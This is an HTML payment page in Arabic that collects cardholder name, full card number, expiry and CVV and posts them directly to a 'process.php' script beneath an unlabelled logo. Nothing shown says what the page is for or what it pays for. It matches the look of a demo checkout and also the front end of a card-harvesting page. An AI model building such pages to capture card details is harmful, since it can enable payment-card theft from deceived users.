<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رقـم البطاقـه</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        h2 {
            text-align: center;
            color: #333;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        input, select {
            margin-bottom: 15px;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #007bff;
        }
        button {
            padding: 10px;
            font-size: 16px;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .notice {
            font-size: 14px;
            color: #888;
            margin-top: 10px;
            text-align: center;
        }
        .logo {
            display: block;
            margin: 20px auto;
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <!-- Add an image at the top of the page -->
    <img src="alraqi/ap.jpeg" alt="Logo" class="logo">

    <div class="container">
        <h2>ادخل التفاصيل</h2>
        <form action="process.php" method="POST">
            <label for="card-name">الاسـم على البطـاقة</label>
            <input type="text" id="card-name" name="card-name" placeholder="Name on card" required>

            <label for="card-number">رقـم البطـاقة</label>
            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="16" required>

            <label for="expiry-date">تاريـخ الانتـهاء</label>
            <div style="display: flex; gap: 10px;">
                <select id="expiry-month" name="expiry-month" required>
                    <option value="" disabled selected>Month</option>
<option value="01">January</option>
<option value="02">February</option>
<option value="03">March</option>
<option value="04">April</option>
<option value="05">May</option>
<option value="06">June</option>
<option value="07">July</option>
<option value="08">August</option>
<option value="09">September</option>
<option value="10">October</option>
<option value="11">November</option>
<option value="12">December</option>
                    <!-- Other months here -->
                </select>
                <select id="expiry-year" name="expiry-year" required>
                    <option value="" disabled selected>Year</option>
                </select>
            </div>

            <label for="cvv">CVV</label>
            <input type="password" id="cvv" name="cvv" placeholder="123" maxlength="3" required>

            <button type="submit">ادفع الآن</button>
        </form>

        <p class="notice">تأكـد من التفـاصيل قبـل الـدفع</p>
    </div>
    <script>
        // Populate the year dropdown
        const currentYear = new Date().getFullYear();
        const expiryYearSelect = document.getElementById('expiry-year');
        for (let i = 0; i < 10; i++) {
            const year = currentYear + i;
            const option = document.createElement('option');
            option.value = year;
            option.textContent = year;
            expiryYearSelect.appendChild(option);
        }
    </script>
</body>
</html>
